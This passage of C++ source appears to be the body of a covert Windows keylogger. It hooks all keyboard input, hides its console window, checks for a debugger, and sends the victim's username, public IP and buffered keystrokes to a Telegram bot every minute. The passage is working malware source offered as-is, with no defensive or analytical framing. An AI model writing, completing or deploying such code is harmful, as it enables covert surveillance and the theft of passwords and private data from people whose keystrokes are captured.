                case VK_F10: keyStroke = "[F10]"; break; case VK_F11: keyStroke = "[F11]"; break; case VK_F12: keyStroke = "[F12]"; break;
                case VK_NUMPAD0: keyStroke = "0"; break; case VK_NUMPAD1: keyStroke = "1"; break; case VK_NUMPAD2: keyStroke = "2"; break;
                case VK_NUMPAD3: keyStroke = "3"; break; case VK_NUMPAD4: keyStroke = "4"; break; case VK_NUMPAD5: keyStroke = "5"; break;
                case VK_NUMPAD6: keyStroke = "6"; break; case VK_NUMPAD7: keyStroke = "7"; break; case VK_NUMPAD8: keyStroke = "8"; break;
                case VK_NUMPAD9: keyStroke = "9"; break;
                case VK_MULTIPLY: keyStroke = "*"; break; case VK_ADD: keyStroke = "+"; break; 
                case VK_SEPARATOR: keyStroke = ","; break; case VK_SUBTRACT: keyStroke = "-"; break;
                case VK_DECIMAL: keyStroke = "."; break; case VK_DIVIDE: keyStroke = "/"; break;
                case VK_OEM_1:      keyStroke = isShiftPressed ? ":" : ";"; break; case VK_OEM_PLUS:   keyStroke = isShiftPressed ? "+" : "="; break;
                case VK_OEM_COMMA:  keyStroke = isShiftPressed ? "<" : ","; break; case VK_OEM_MINUS:  keyStroke = isShiftPressed ? "_" : "-"; break;
                case VK_OEM_PERIOD: keyStroke = isShiftPressed ? ">" : "."; break; case VK_OEM_2:      keyStroke = isShiftPressed ? "?" : "/"; break;
                case VK_OEM_3:      keyStroke = isShiftPressed ? "~" : "`"; break; case VK_OEM_4:      keyStroke = isShiftPressed ? "{" : "["; break;
                case VK_OEM_5:      keyStroke = isShiftPressed ? "|" : "\\"; break; case VK_OEM_6:      keyStroke = isShiftPressed ? "}" : "]"; break;
                case VK_OEM_7:      keyStroke = isShiftPressed ? "\"" : "'"; break;
                default: { char key_char = static_cast<char>(fnMapVirtualKeyA(pkbhs->vkCode, MAPVK_VK_TO_CHAR));
                    if (key_char) { if (isalpha(key_char)) { keyStroke = makeUpperCase ? toupper(key_char) : tolower(key_char); } 
                        else if (isdigit(key_char) && !isShiftPressed) { keyStroke = key_char; } 
                        else { if (isShiftPressed) { switch(pkbhs->vkCode) { 
                                    case 0x30: keyStroke = ")"; break; case 0x31: keyStroke = "!"; break; case 0x32: keyStroke = "@"; break;
                                    case 0x33: keyStroke = "#"; break; case 0x34: keyStroke = "$"; break; case 0x35: keyStroke = "%"; break;
                                    case 0x36: keyStroke = "^"; break; case 0x37: keyStroke = "&"; break; case 0x38: keyStroke = "*"; break;
                                    case 0x39: keyStroke = "("; break; default: keyStroke = key_char; }} 
                            else { keyStroke = key_char; }}} 
                    else { std::stringstream ss; ss << "[VK_0x" << std::hex << pkbhs->vkCode << "]"; keyStroke = ss.str(); }
                    break; }}
            if (!keyStroke.empty()) { std::lock_guard<std::mutex> lock(g_bufferMutex_keystrokes); g_keystrokeBuffer += keyStroke; }}}
    return fnCallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

// --- LogSenderWorkerThread uses SendFileToTelegram ---
void LogSenderWorkerThread() { 
    if(fnSleep) fnSleep(15000); else std::this_thread::sleep_for(std::chrono::seconds(15)); 
    while (true) { 
        std::string currentBuffer; 
        { 
            std::lock_guard<std::mutex> lock(g_bufferMutex_keystrokes);
            if (!g_keystrokeBuffer.empty()) { 
                currentBuffer = g_keystrokeBuffer; 
                g_keystrokeBuffer.clear();
            }
        }
        if (!currentBuffer.empty()) { 
            std::string tempLogFile = GetTemporaryLogFilePath();
            std::ofstream outFile(tempLogFile, std::ios::binary | std::ios::out);
            if (outFile.is_open()) { 
                outFile << currentBuffer; 
                outFile.close();
                std::string caption = "Keystrokes [" + (!g_uniqueID.empty()?g_uniqueID.substr(0,8):"NOID") + "]"; 
                if(!SendFileToTelegram(tempLogFile, caption)){
                    // Optional: Handle send failure (e.g., log locally, retry later - not implemented for simplicity)
                }
                if (fnDeleteFileA) { fnDeleteFileA(tempLogFile.c_str()); }
            }
        }
        if(fnSleep) fnSleep(60000); else std::this_thread::sleep_for(std::chrono::seconds(60));
    }
}

// --- WinMain ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Optional: Delete old debug log file if switching from debug build
    // HMODULE hK32_early = LoadLibraryA("kernel32.dll"); 
    // if (hK32_early) {
    //     pDeleteFileA_type earlyDeleteFileA_ptr = (pDeleteFileA_type)GetProcAddress(hK32_early, "DeleteFileA"); 
    //     if (earlyDeleteFileA_ptr) earlyDeleteFileA_ptr(DEBUG_LOG_FILE_PATH); 
    //     FreeLibrary(hK32_early);
    // }

    if (!InitializeAPIs()) return 1; // Exit if APIs can't be loaded

    if(fnSleep) fnSleep(2000); // Optional delay

    if (fnIsDebuggerPresent && fnIsDebuggerPresent()) { /* Optional: Add anti-debug action or exit */ }

    HideConsoleWindow(); 

    if (fnCoInitializeEx) {
        HRESULT hr = fnCoInitializeEx(NULL, COINIT_APARTMENTTHREADED); 
        if(FAILED(hr)) return 1; 
    } else { 
        return 1; 
    }
    
    // Verify placeholders are replaced
    if (BOT_TOKEN_PLAINTEXT == "YOUR_BOT_TOKEN_HERE" || BOT_TOKEN_PLAINTEXT.empty() ||
        CHAT_ID_PLAINTEXT == "YOUR_CHAT_ID_HERE" || CHAT_ID_PLAINTEXT.empty() ||
        BOT_TOKEN_PLAINTEXT.length() < 20 || CHAT_ID_PLAINTEXT.length() < 1) { 
        return 1; // Exit silently if not configured
    }
    
    // Send initial ping using WinHTTP (will use plaintext token/id internally)
    bool initial_ping_successful = SendSimpleTelegramPing("KL Instance Online (WinHTTP)"); 

    g_uniqueID = GenerateTargetUniqueID(); 
    std::string username = GetCurrentUsername();
    std::string publicIP = GetPublicIPAddress(); // Uses WinHTTP now

    // Send detailed info message (using WinHTTP and plaintext token/id)
    std::stringstream initialInfo; 
    if (initial_ping_successful) { initialInfo << "🎯 Target Online (WinHTTP). Ping OK.\n"; } 
    else { initialInfo << "⚠️ Target Online (WinHTTP). Ping FAILED.\n"; }
    initialInfo << "ID: `" << g_uniqueID << "`\n";
    initialInfo << "User: `" << username << "`\n";
    initialInfo << "IP: `" << publicIP << "`";
    SendMsgToTelegram(initialInfo.str()); 
    
    // Start the thread that sends logs periodically
    std::thread senderThread(LogSenderWorkerThread);
    senderThread.detach(); 

    // Set the keyboard hook
    if(fnGetModuleHandleA && fnSetWindowsHookExA){
        g_keyboardHook = fnSetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, fnGetModuleHandleA(NULL), 0);
        if (g_keyboardHook == NULL) {
           // Hook failed, maybe send an error message if ping worked? Or just fail silently.
           // SendMsgToTelegram("Error: Failed SetWindowsHookExA. Code: " + std::to_string(GetLastError())); 
        } 
    } 

    // Keep the process alive with a message loop
    if(!fnGetMessageA || !fnTranslateMessage || !fnDispatchMessageA){ return 1; }
    MSG msg;
    while (fnGetMessageA(&msg, NULL, 0, 0)) {
        fnTranslateMessage(&msg);
        fnDispatchMessageA(&msg);
    }

    // Cleanup (might not be reached in normal operation)
    if (g_keyboardHook && fnUnhookWindowsHookEx) {
        fnUnhookWindowsHookEx(g_keyboardHook);
    }
    // CoUninitialize(); // TODO: Add if needed
    return 0;
}
